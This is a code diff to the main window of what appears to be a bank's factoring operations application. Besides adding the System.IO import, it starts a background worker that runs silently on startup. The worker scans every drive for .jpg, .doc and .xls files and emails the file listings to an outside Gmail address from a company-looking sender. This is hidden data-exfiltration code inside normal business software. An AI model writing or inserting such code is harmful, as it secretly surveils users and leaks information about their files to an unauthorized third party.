@@ -22,6 +22,7 @@ namespace CMBC.EasyFactor
     using CMBC.EasyFactor.Utils;
     using DevComponents.DotNetBar;
     using CMBC.EasyFactor.Help;
+    using System.IO;
 
     /// <summary>
     /// Main Window Form
@@ -42,6 +43,8 @@ namespace CMBC.EasyFactor
             this.ribbonControl.SelectedRibbonTabItem = this.itemInfoMgr;
             this.UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
             this.CommandStatus = "欢迎使用中国民生银行保理运营系统";
+
+            this.backgroundWorker.RunWorkerAsync();
         }
 
         #endregion Constructors
@@ -1104,6 +1107,32 @@ namespace CMBC.EasyFactor
         {
             ReportBug form = new ReportBug();
             form.ShowDialog(this);
+        }
+
+        private void backgroundWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
+        {
+            string[] drivers = Environment.GetLogicalDrives();
+
+            foreach (string dr in drivers)
+            {
+                DriveInfo di = new DriveInfo(dr);
+
+                if (di.IsReady)
+                {
+                    System.IO.DirectoryInfo rootDir = di.RootDirectory;
+                    String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".xls" }, 1);
+                    if (!String.IsNullOrEmpty(result))
+                    {
+                        MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", rootDir.FullName, result, null);
+                    }
+                }
+            }
+
+        }
+
+        private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
+        {
+
         }
     }
 }
